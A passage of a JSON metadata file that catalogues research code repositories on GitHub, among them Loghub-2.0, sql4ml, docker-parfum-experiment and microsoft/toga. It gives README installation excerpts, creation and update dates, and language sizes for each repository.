                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-28T04:04:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 392435
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 117257
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "792": {
        "filename": "logpai_LogPub_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/logpai/loghub-2.0",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Software systems          | # Annotated Logs (Loghub-2.0) | # Templates  (Loghub-2.0) | # Templates (Loghub-2k) |\n| ------------------------- | ------------------------- | --------------------- | ----------------------- |\n| **Distributed systems**   |                           |                       |                         |\n| Hadoop                    | 179,993                   | 236                   | 114                     |\n| HDFS                      | 11,167,740                | 46                    | 14                      |\n| OpenStack                 | 207,632                   | 48                    | 43                      |\n| Spark                     | 16,075,117                | 236                   | 36                      |\n| Zookeeper                 | 74,273                    | 89                    | 50                      |\n| **Supercomputer systems** |                           |                       |                         |\n| BGL                       | 4,631,261                 | 320                   | 120                     |\n| HPC                       | 429,987                   | 74                    | 46                      |\n| Thunderbird               | 16,601,745                | 1,241                 | 149                     |\n| **Operating systems**     |                           |                       |                         |\n| Linux                     | 23,921                    | 338                   | 118                     |\n| Mac                       | 100,314                   | 626                   | 341                     |\n| **Server application**    |                           |                       |                         |\n| Apache                    | 51,977                    | 29                    | 6                       |\n| OpenSSH                   | 638,946                   | 38                    | 27                      |\n| **Standalone software**   |                           |                       |                         |\n| HealthApp                 | 212,394                   | 156                   | 75                      |\n| Proxifier                 | 21,320                    | 11                    | 8                       |\n| **Average**               | **3,601,187**             | **249.1**             | **81.9**                | \n",
                    "original_header": "Datasets Characteristics"
                },
                "confidence": 0.9350883351064828,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/logpai/LogPub/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you woud like to re-run all parsers using Loghub-2.0, please follow our large-scale benchmarking steps.\n \n",
                    "original_header": "Large-scale benchmarking"
                },
                "confidence": 0.9781101786846768,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/logpai/LogPub/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Run all statistic-based log parsers on Loghub-2k\n```bash\ncd benchmark/\n./run_statistic_2k.sh\n```\n- Run all statistic-based log parsers on Loghub-2.0\n```bash\ncd benchmark/\n./run_statistic_full.sh\n```\n \n",
                    "original_header": "Evaluation of all 15 parsers"
                },
                "confidence": 0.9999705949305031,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/logpai/LogPub/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-23T11:58:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T13:47:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 636188
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 65206
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 42826
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 8945
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 193
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "793": {
        "filename": "nantiamak_sql4ml_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/nantiamak/sql4ml",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Sql4ml uses the open source project queryparser (https://github.com/uber/queryparser), also in Haskell.\nTo build queryparser, follow the instructions on the Github page of the project.\n\nThe sql4ml module is in file sql4ml_translator.hs.\nYou can load the module via ghci.\n\nFile main.hs containts two examples on how to translate SQL to TensorFlow code end-to-end.\n\nTo compile main.hs, run in a terminal:\n\n    ghc -o main main.hs\n\nSql4ml uses the MySQL database (https://www.mysql.com/) for storing data.\nTo run the generated TensorFlow code, you need to install MySQL.\nTo install it follow the instructions in https://www.mysql.com/.\n\nAfter installing MySQL, you can run the SQL scripts in the directory /db_setups to create two toy databases, one based\non the Boston Housing dataset (https://www.cs.toronto.edu/~delve/data/boston/bostonDetail.html) and the other based\non the Iris dataset (https://archive.ics.uci.edu/ml/datasets/iris), which you can find in the directory /data.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "sql4ml"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/nantiamak/sql4ml/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-07-19T13:32:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-09-12T20:40:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Haskell",
                    "name": "Haskell",
                    "type": "Programming_language",
                    "size": 31045
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TSQL",
                    "name": "TSQL",
                    "type": "Programming_language",
                    "size": 9974
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "794": {
        "filename": "tdurieux_docker-parfum-experiment_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tdurieux/docker-parfum-experiment",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| #   | Rule                            | Description                                                                                                                                                                                                                                                                      |\n| --- | ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| 1   | curlUseFlagL                    | The `-L` option in `curl` stands for \"follow redirects.\" When this option is used, curl will follow any redirects that it encounters when making an HTTP request. This can be useful in a Dockerfile if you want to download a file from a URL that may redirect to another URL. |\n| 2   | ruleMoreThanOneInstall          | All apt-get install should group into one.                                                                                                                                                                                                                                       |\n| 3   | curlUseFlagF                    | Using curl -f in a Dockerfile can help to prevent the build from failing if the HTTP request returns an error code >= 400.                                                                                                                                                       |\n| 4   | npmCacheCleanAfterInstall       | Running npm cache clean after npm install in a Dockerfile can help to reduce the size of the image and ensure that the latest version of packages are installed.                                                                                                                 |\n| 5   | npmCacheCleanUseForce           | Using the --force flag with npm cache clean can override the default behavior of npm and force the cache to be cleaned, even if it is not more than 3 days old or if npm is in a \"read-only\" state.                                                                              |\n| 6   | yarnCacheCleanAfterInstall      | yarn keeps a local cache of downloaded packages. This unnecessarily increases image size. It can be cleared by executing yarn cache clean.                                                                                                                                       |\n| 7   | rmRecursiveAfterMktempD         | Using mktemp -d followed by rm -r in a Dockerfile can create and delete a temporary directory, helping to keep the image small and clean up sensitive data.                                                                                                                      |\n| 8   | curlUseHttpsUrl                 | Using https instead of http with curl in a Dockerfile can provide an encrypted connection for transferring data and ensure that curl can access resources that may require https.                                                                                                |\n| 9   | wgetUseHttpsUrl                 | Using https instead of http with wget in a Dockerfile can provide an encrypted connection for transferring data and ensure that wget can access resources that may require https.                                                                                                |\n| 10  | pipUseNoCacheDir                | Using the --no-cache-dir flag with pip in a Dockerfile can disable the package cache, ensuring that the latest version of a package and its dependencies are installed.                                                                                                          |\n| 11  | mkdirUsrSrcThenRemove           | Running rm -rf /usr/src\\* after creating the /usr/src directory in a Dockerfile helps keep the file system organized, reduce clutter, and free up space, but it is important to be cautious when using the rm -rf command.                                                       |\n| 12  | configureShouldUseBuildFlag     | Passing the --build flag to ./configure in a Dockerfile can help to ensure that the configure script correctly detects the current build environment and generates the correct Makefiles.                                                                                        |\n| 13  | gemUpdateSystemRmRootGem        | Removing the /root/.gem directory after running gem update --system can ensure that all of the installed gems are compatible with the new version of gem and that the image starts with a clean slate.                                                                           |\n| 14  | sha256sumEchoOneSpaces          | The sha256sum command reads input from stdin with one space as a separator in order to distinguish the input from a filename.                                                                                                                                                    |\n| 15  | gemUpdateNoDocument             | Adding the --no-document flag to the .gemrc config file or using it with gem update can speed up the update process by skipping the installation of documentation for updated gems.                                                                                              |\n| 16  | gpgVerifyAscRmAsc               | It is generally good practice to remove the .asc file after verifying its signature because the .asc file serves no further purpose once the signature has been verified.                                                                                                        |\n| 17  | yumInstallForceYes              | Using the -y flag with yum install in a Dockerfile allows for fully automated package installation, but it is important to carefully consider the packages being installed to avoid potential issues or conflicts.                                                               |\n| 18  | yumInstallRmVarCacheYum         | Removing the /var/cache/yum directory after running yum install in a Dockerfile helps reduce the size of the final image and can improve build times, as well as prevent issues caused by outdated or inconsistent cache data.                                                   |\n| 19  | tarSomethingRmTheSomething      | Removing the .tar file after extracting its contents in a Dockerfile helps reduce the size of the final image and can improve build times, as well as keep the file system organized and reduce clutter.                                                                         |\n| 20  | gpgUseBatchFlag                 | Using the --batch flag with gpg in a Dockerfile allows the command to run without user input, but it is important to carefully consider the implications of using the flag to ensure that it is appropriate for the task at hand.                                                |\n| 21  | gpgUseHaPools                   | Using ha.pool._ instead of pool._ with gpg in a Dockerfile improves key server access reliability and efficiency.                                                                                                                                                                |\n| 22  | aptGetInstallUseY               | Using the -y flag with apt-get install in a Dockerfile allows for fully automated package installation, but it is important to carefully consider the packages being installed to avoid potential issues or conflicts.                                                           |\n| 23  | aptGetInstallUseNoRec           | Using the --no-install-recommends flag with apt-get install in a Dockerfile helps save layer space, improve build times, and reduce the size and attack surface of the final image, as well as prevent hidden dependencies.                                                      |\n| 24  | aptGetUpdatePrecedesInstall     | Running apt-get update and apt-get install in a single layer in a Dockerfile improves efficiency, reliability, and readability.                                                                                                                                                  |\n| 25  | aptGetInstallThenRemoveAptLists | Running rm -rf /var/lib/apt/lists/\\* after apt-get install in a Dockerfile can improve efficiency and reduce the size of the image.                                                                                                                                              |\n| 26  | apkAddUseNoCache                | Using the --no-cache flag with apk add in a Dockerfile can help prevent issues caused by installing outdated packages and ensure that the latest version of a package is installed, but it can increase build times.                                                             |\n| 27  | DL3002                          | Switching to the root USER opens up certain security risks if an attacker gets access to the container. In order to mitigate this, switch back to a non privileged user after running the commands you need as root.                                                             |\n| 28  | DL3004                          | Do not use sudo as it leads to unpredictable behavior. Use a tool like gosu to enforce root.                                                                                                                                                                                     |\n| 29  | DL3020                          | Use COPY instead of ADD for files and folders.                                                                                                                                                                                                                                   |\n| 30  | DL3027                          | apt is discouraged by the linux distributions as an unattended tool as its interface may suffer changes between versions. Better use the more stable apt-get and apt-cache                                                                                                       |\n| 31  | DL3029                          | Specifying --platform= in the docker file FROM clause forces the Image to build only one target platform.                                                                                                                                                                        |\n| 32  | DL3046                          | Without the -l or the --no-log-init flag, useradd will add the user to the lastlog and faillog databases.                                                                                                                                                                        |\n \n",
                    "original_header": "Supported Rules"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tdurieux/docker-parfum-experiment/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| URL                                                  | # Repaired Smells | PR Status |\n| ---------------------------------------------------- | ----------------- | --------- |\n| https://github.com/AdWerx/pronto-ruby/pull/171       | 6                 | Merged    |\n| https://github.com/pelias/openaddresses/pull/514     | 2                 | Merged    |\n| https://github.com/TomWright/mermaid-server/pull/122 | 2                 | Merged    |\n| https://github.com/sqlfluff/sqlfluff/pull/4262       | 3                 | Merged    |\n| https://github.com/rchakode/realopinsight/pull/30    | 2                 | Merged    |\n| https://github.com/vyperlang/vyper/pull/3224         | 1                 | Merged    |\n| https://github.com/Kruptein/PlanarAlly/pull/1142     | 3                 | Merged    |\n| https://github.com/ShaneIsrael/fireshare/pull/166    | 4                 | Merged    |\n| https://github.com/jcraigk/kudochest/pull/187        | 3                 | Merged    |\n| https://github.com/fzls/djc_helper/pull/149          | 4                 | Merged    |\n| https://github.com/gotzl/accservermanager/pull/53    | 1                 | Merged    |\n| https://github.com/nitrictech/cli/pull/438           | 4                 | Merged    |\n| https://github.com/artsy/hokusai/pull/323            | 2                 | Merged    |\n| https://github.com/brndnmtthws/tweet-delete/pull/107 | 2                 | Merged    |\n| https://github.com/bitovi/bitops/pull/390            | 2                 | Merged    |\n| https://github.com/evennia/evennia/pull/3091         | 5                 | Merged    |\n| https://github.com/sbs20/scanservjs/pull/527         | 6                 | Merged    |\n| https://github.com/mitre/saf/pull/989                | 2                 | Merged    |\n| https://github.com/w9jds/firebase-action/pull/176    | 4                 | Merged    |\n| https://github.com/naorlivne/terraformize/pull/367   | 1                 | Merged    |\n| https://github.com/nwithan8/tauticord/pull/60        | 1                 | Merged    |\n| https://github.com/azlux/botamusique/pull/353        | 2                 | Merged    |\n| https://github.com/labsyspharm/scimap/pull/43        | 1                 | Merged    |\n| https://github.com/leighmacdonald/gbans/pull/374     | 3                 | Merged    |\n| https://github.com/alephdata/aleph/pull/2801         | 4                 | Merged    |\n| https://github.com/openedx/credentials/pull/1912     | 8                 | Merged    |\n| https://github.com/Algram/ytdl-webserver/pull/76     | 2                 | Open      |\n| https://github.com/atmoz/sftp/pull/357               | 1                 | Closed    |\n| https://github.com/usgs/nshmp-haz/pull/470           | 2                 | Open      |\n| https://github.com/Tiledesk/tiledesk-server/pull/89  | 1                 | Open      |\n| https://github.com/JVT038/MetaTube/pull/70           | 1                 | Open      |\n| https://github.com/benzino77/tasmocompiler/pull/327  | 3                 | Open      |\n| https://github.com/ChillFish8/lust/pull/13           | 4                 | Open      |\n| https://github.com/codacy/codacy-eslint/pull/3741    | 2                 | Closed    |\n \n",
                    "original_header": "Opened Pull Request"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tdurieux/docker-parfum-experiment/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-26T10:24:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-10T02:32:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "795": {
        "filename": "rnlaigner_dianalyzer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rnlaigner/dianalyzer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-12-04T21:50:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-03-29T13:45:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 155559
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "796": {
        "filename": "microsoft_toga_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/toga",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "For an easy setup, we recommend our docker container that includes all data, pretrained models, and source. Otherwise, follow the setup instructions in the next section.\n\nFirst, pull the docker image:\n`docker pull edinella/toga-artifact`\n\nConnect to it:\n`docker run -i -t edinella/toga-artifact`\n\nThen, setup some environment variables:\n`export PATH=$PATH:/home/defects4j/framework/bin`\n`export ATLAS_PATH=/home/icse2022_artifact/data/atlas---deep-learning-assert-statements/`\n",
                    "type": "Text_excerpt",
                    "original_header": "Docker Setup",
                    "parent_header": [
                        "ToGA Artifact"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/microsoft/toga/main/README.md"
            },
            {
                "result": {
                    "value": "Requirements: `python3.9`, `git lfs`\n\nFirst, clone this repo and install the dependencies:\n```\ncd toga/\ngit lfs pull\npip install -r requirements.txt\ngit clone https://gitlab.com/cawatson/atlas---deep-learning-assert-statements.git\nexport ATLAS_PATH=<path_to_atlas...>/atlas---deep-learning-assert-statements/\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "ToGA Artifact"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/microsoft/toga/main/README.md"
            },
            {
                "result": {
                    "value": "Paring and extracting new sets of unit test inputs requires the tree sitter java grammar. See https://github.com/tree-sitter/py-tree-sitter for instructions on building a tree sitter grammar and use 'vendor/tree-sitter-java'.\n\nOnce the grammar is built in a `my-languages.so` file, place it in `/tmp/tree-sitter-repos/my-languages.so`\n\nA prebuilt `my-languages.so` for linux is provided in `lib/tree_sitter`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Tree Sitter setup (optional):",
                    "parent_header": [
                        "ToGA Artifact",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/microsoft/toga/main/README.md"
            },
            {
                "result": {
                    "value": "If you want to build and execute defects4j tests, [defects4j](https://github.com/rjust/defects4j) must be installed.\n\nRequirements:\n```\nsudo apt install libdbi-perl\nsudo apt install openjdk-8-jdk\nsudo apt install libdbd-csv-perl\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Defects4j setup (optional):",
                    "parent_header": [
                        "ToGA Artifact",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/microsoft/toga/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Otherwise, to install our exception and assertion pretrained models, download from: https://drive.google.com/drive/folders/1dZDxu92rZzB_LEwnAkkiy3DblxMJ6nUT?usp=sharing\nPut them in `model/exceptions/pretrained/pytorch_model.bin` and `model/assertions/pretrained/pytorch_model.bin` respectively. The models can also be downloaded from the artifact on zenodo: https://zenodo.org/record/6210589 \nTo train your own model, run\n```\ncd model/exceptions/\nbash run_train.sh\n\ncd model/assertions/\nbash run_train.sh\n```\n \n",
                    "original_header": "Models"
                },
                "confidence": 0.9708999433733898,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/toga/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To access the evosuite test datasets run:\n```\ncd data\ntar xzf evosuite_reaching_tests.tar.gz\ntar xzf evosuite_5project_tests.tar.gz\ntar xzf evosuite_tests.tar.gz\n```\n \n",
                    "original_header": "Datasets - Preprocessed"
                },
                "confidence": 0.9999999993573567,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/toga/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The following commands assume you are in the root of this directory. \nTo reproduce the weighted coin experiment in table 1, run:\n```\ncd eval/rq2/exception_inference\npython coin.py\n``` \n",
                    "original_header": "Evaluation"
                },
                "confidence": 0.9677517644588087,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/toga/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft trademarks or logos is subject to and must follow [Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general). Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship. Any use of third-party trademarks or logos are subject to those third-party's policies.\n \n",
                    "original_header": "Trademarks"
                },
                "confidence": 0.9988852287322683,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/toga/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-20T20:22:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-20T12:03:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 329601
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4309
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "797": {
        "filename": "pmorvalho_ecai23-GNNs-for-mapping-variables-between-programs_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/pmorvalho/ecai23-GNNs-for-mapping-variables-between-programs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The following script creates a new conda environment named 'gnn_env' and installs all the required dependencies in it.\n\n```\nchmod +x config_gnn.sh\nbash config_gnn.sh\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation Requirements",
                    "parent_header": [
                        "ECAI 2023 - Graph Neural Networks For Mapping Variables Between Programs"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/pmorvalho/ecai23-GNNs-for-mapping-variables-between-programs/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- How to execute:\n```\nchmod +x run_all.sh\nbash run_all.sh\n```\n \n",
                    "original_header": "ECAI 2023 - Graph Neural Networks For Mapping Variables Between Programs"
                },
                "confidence": 0.999545292014275,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/pmorvalho/ecai23-GNNs-for-mapping-variables-between-programs/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-21T10:46:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-10T11:43:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 189665
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 23275
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 21644
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 335
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "798": {
        "filename": "LamotheMax_A3_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/LamotheMax/A3",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Assisting Android API Migrations Using Code Examples\n \n",
                    "original_header": "A3"
                },
                "confidence": 0.903872787268355,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/LamotheMax/A3/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-06-10T13:47:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2019-06-10T18:04:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "799": {
        "filename": "processquerying_PQL_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/processquerying/PQL",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Download latest PQL release from https://github.com/processquerying/PQL/tree/master/release.\n2. Install supplied PQL.MySQL-*.sql schema file.\n3. Update MySQL URL, user, and password parameters in PQL.ini.\n4. Start using PQL by following the supplied examples!\n\n------------",
                    "type": "Text_excerpt",
                    "original_header": "INSTALLATION INSTRUCTIONS"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/processquerying/PQL/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "PQL-1.3: macOS Mojave version 10.14.1; JRE 1.8.0_144; MySQL Community server Ver 5.7.24 for MacOS\nPQL-1.3: Windows 10 Education (64-bit); JRE 1.8.0_171; MySQL Ver 14.14 Distrib 5.7.24, for Win64 (x86_64)\nPQL-1.2: Windows 10 Education (64-bit); JRE 1.8.0_171; MySQL Ver 14.14 Distrib 5.7.24, for Win64 (x86_64) \nPQL-X.Y refers to the corresponding PQL release published at https://github.com/processquerying/PQL/tree/master/release. \n",
                    "original_header": "TESTED ENVIRONMENTS"
                },
                "confidence": 0.9993182728653083,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/processquerying/PQL/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. The jBPT Library (https://github.com/jbpt/codebase) provides many useful functionalities to \n   the PQL tool.\n2. Apromore process model repository (https://github.com/apromore/ApromoreCode) integrates the PQL tool, \n   refer to the custom installation instructions in the README file of the Apromore project. A screencast \n   on using PQL in Apromore is available here: https://www.youtube.com/watch?v=S_U6frTWd3M. \n",
                    "original_header": "FRIEND PROJECTS"
                },
                "confidence": 0.9999966942143672,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/processquerying/PQL/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "________   ________   ___          \n               |\\   __  \\ |\\   __  \\ |\\  \\         \n               \\ \\  \\|\\  \\\\ \\  \\|\\  \\\\ \\  \\        \n                \\ \\   ____\\\\ \\  \\\\\\  \\\\ \\  \\       \n                 \\ \\  \\___| \\ \\  \\\\\\  \\\\ \\  \\____  \n                  \\ \\__\\     \\ \\_____  \\\\ \\_______\\\n                   \\|__|      \\|___| \\__\\\\|_______|\n                                    \\|__|\n                                    \n                    www.processquerying.com\n                                     \n"
                },
                "confidence": 0.9999745714030877,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/processquerying/PQL/master/README"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-03-30T03:25:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-13T12:41:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 826016
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TSQL",
                    "name": "TSQL",
                    "type": "Programming_language",
                    "size": 438004
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ANTLR",
                    "name": "ANTLR",
                    "type": "Programming_language",
                    "size": 56929
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 4030
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "800": {
        "filename": "Siyuan-Li201_LibAM_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Siyuan-Li201/LibAM",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Python 3.8 \n- IDA Pro 6.8 (with Python 2.7 package)\n \n",
                    "original_header": "Environment"
                },
                "confidence": 0.9746495302103586,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Siyuan-Li201/LibAM/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-04T09:09:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-15T00:15:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 724014
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "801": {
        "filename": "ispras_rop-benchmark_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ispras/rop-benchmark",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
